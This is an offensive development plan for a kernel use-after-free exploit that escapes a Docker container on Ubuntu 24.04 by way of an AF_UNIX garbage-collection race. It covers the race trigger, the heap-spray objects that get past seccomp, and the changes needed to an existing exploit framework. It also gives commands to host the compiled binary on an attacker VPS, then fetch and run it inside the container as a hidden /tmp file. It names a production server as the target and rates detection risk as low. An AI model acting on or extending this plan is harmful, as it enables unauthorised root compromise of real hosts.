# 0-Day Development Plan — Container Escape Without AF_PACKET

## Executive Summary

We need to escape a Docker container on kernel 6.8.0-90-generic (Ubuntu 24.04) without using `AF_PACKET`, `add_key`, or `unshare(NEWUSER)` — all blocked by Docker's default seccomp.

The most promising path is **combining**:
1. **CVE-2026-80521 trigger** (AF_UNIX GC send+close race → UAF on `struct unix_vertex`)
2. **bad_garbage framework** (proven to work on target: BTF resolves, SLUB warmup OK, xattr/pipe spray works)

## Why This Is Feasible

### What Already Works on Target
- `bad_garbage` framework runs: BTF resolution ✅, SLUB grooming ✅, xattr spray ✅, pipe reclaim ✅
- The only thing that DOESN'T work is the **MSG_PEEK race trigger** (wrong kernel version)
- CVE-2026-80521 bug EXISTS in kernel 6.8 (confirmed by Ubuntu advisory, DepthFirst demo)
- The CVE-2026-80521 trigger uses ONLY `socket()`, `sendmsg(SCM_RIGHTS)`, `close()` — ALL allowed

### What Needs To Be Developed
1. **New race trigger** — replace MSG_PEEK race with send+close SCC race
2. **SLUB adaptation** — order-1 (32 objs/slab) instead of order-0 (16 objs/slab)
3. **Timing calibration** — different race window timing for the send+close pattern

## Detailed Technical Analysis

### CVE-2026-80521 Bug Mechanism

```c
// In net/unix/af_unix.c — unix_dgram_sendmsg() or unix_stream_sendmsg():

maybe_add_creds(skb, sock, other);
scm_stat_add(other, skb);          // Calls unix_add_edges() → edges visible to GC
                                    // ← RACE WINDOW OPENS HERE
spin_lock(&other->sk_receive_queue.lock);
__skb_queue_tail(&other->sk_receive_queue, skb);  // skb queued
spin_unlock(&other->sk_receive_queue.lock);
                                    // ← RACE WINDOW CLOSES HERE
```

The race: edge is published (GC sees it) but skb is not yet on the queue (GC can't collect it).

### Trigger Pattern (No MSG_PEEK needed)

```
Step 1: Create two sockets A and B, connected in SCC:
   A ----SCM_RIGHTS(B)----> B
   B ----SCM_RIGHTS(A)----> A
   (This creates SCC: {A, B})

Step 2: From external socket X, start send(B→B):
   Thread 1: sendmsg(X, B_fd, SCM_RIGHTS) to B
   
   During send, unix_add_edges() makes edge B→B visible.
   But skb not yet on B's receive queue.

Step 3: Concurrently, Thread 2: close(A), close(B)
   This triggers GC which sees SCC {A,B} as dead.
   GC frees vertices for A and B.
   BUT the skb from step 2 (B→B) is NOT on queue yet.
   It still holds a reference to B's socket.

Step 4: B's vertex is freed but its scc_entry remains linked
   in the SCC ring. Next GC pass walks freed memory → UAF.
```

### Heap Spray Strategy (Without AF_PACKET)

**Target object**: `struct unix_vertex` (72 bytes → kmalloc-96)

**Spray candidates that land in kmalloc-96**:
1. `msg_msg` header (48 bytes header + variable data) — via `msgsnd()`
   - Can target kmalloc-96 with msg size 48 (48 header + 48 data = 96)
   - Full content control
   - Lifetime: until `msgrcv()`
   
2. `setxattr` — via `setxattr()` on proc/sysfs/tmpfs
   - Allocates kmalloc-N where N fits the xattr value
   - Full content control
   - BUT: very short lifetime (freed after copy) — usable for cross-cache but not stable reclaim
   
3. `simple_xattr` — via `setxattr()` on tmpfs inode
   - Persistent allocation in kmalloc-* 
   - bad_garbage already uses this! (xattr.c)
   
4. `sk_buff` — via `sendmsg()` to AF_UNIX socket
   - skb header in skbuff_head_cache (256 bytes)
   - skb data in kmalloc-* (variable size)
   - bad_garbage already uses this! (lib_slubfw.c)

### bad_garbage Framework Architecture

```
BAD_GARBAGE.c     — Main exploit: race trigger + post-UAF exploitation
lib_slubfw.c/h    — SLUB cross-cache page reclaim (uses sk_buff + pipe)
lib_fault.c/h     — Fault-based timing + RO page scan
offset.c/h        — BTF offset resolver (reads /sys/kernel/btf/vmlinux)
race.c/h          — Race condition infrastructure
shell.c/h         — Post-exploit shell spawning
xattr.c/h         — Extended attribute spray/reclaim
pagemap.c/h       — Physical address resolution
kallsysms.c/h     — Kernel symbol lookup
dirtypt.c/h       — Dirty pagetable technique
sstd.c/h          — Standard helpers
```

### Required Modifications to bad_garbage

1. **BAD_GARBAGE.c**: Replace entire MSG_PEEK race logic with send+close race:
   - Remove `recvmsg(..., MSG_PEEK)` trigger
   - Add concurrent `sendmsg(SCM_RIGHTS)` + `close()` threads
   - The freed object is `struct unix_vertex` (kmalloc-96), not `sk_buff`
   - Need different post-UAF strategy (current assumes freed skbuff_head)

2. **lib_slubfw.c**: Adapt for order-1 slabs:
   - Change `GR_O` from 16 to 32 (objs_per_slab)
   - Change `GR_B` from 7 to 30 (cpu_partial)
   - Pipe reclaim gives order-0 pages → need 2 consecutive pipes for order-1
   - OR use different reclaim (e.g., large msg_msg for order-1 allocation)

3. **offset.c**: Already works with BTF → no changes needed

4. **New file**: `trigger_80521.c` — implements the send+close race:
   - Create SCC graph of AF_UNIX sockets
   - Concurrent sendmsg + close to trigger partial GC
   - Detect when vertex is freed (timing or side-channel)
   - Signal spray thread to reclaim

## Compilation & Testing

```bash
# Compile on Kali (cross-compile static for Alpine/musl):
gcc -O2 -static -Wall -pthread -o exploit *.c -lm

# Upload to target via VPS HTTP server:
scp exploit root@VPS:/var/www/html/e

# From container:
wget -q http://VPS:8080/e -O /tmp/.e && chmod +x /tmp/.e && /tmp/.e
```

## Risk Assessment

- **Kernel panic risk**: HIGH — UAF exploitation on production 48-core server
- **Detection risk**: LOW — uses only standard syscalls, no module loading
- **Success probability**: MEDIUM — framework proven, trigger needs development
- **Development time estimate**: 2-4 weeks for experienced kernel exploit developer
